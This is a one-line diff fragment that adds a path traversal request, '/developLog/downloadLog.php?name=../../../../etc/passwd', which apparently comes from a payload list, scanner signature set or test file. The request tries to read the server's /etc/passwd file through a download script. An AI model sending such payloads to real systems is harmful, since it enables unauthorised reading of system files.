@@ -1,0 +1,1 @@
+/developLog/downloadLog.php?name=../../../../etc/passwd
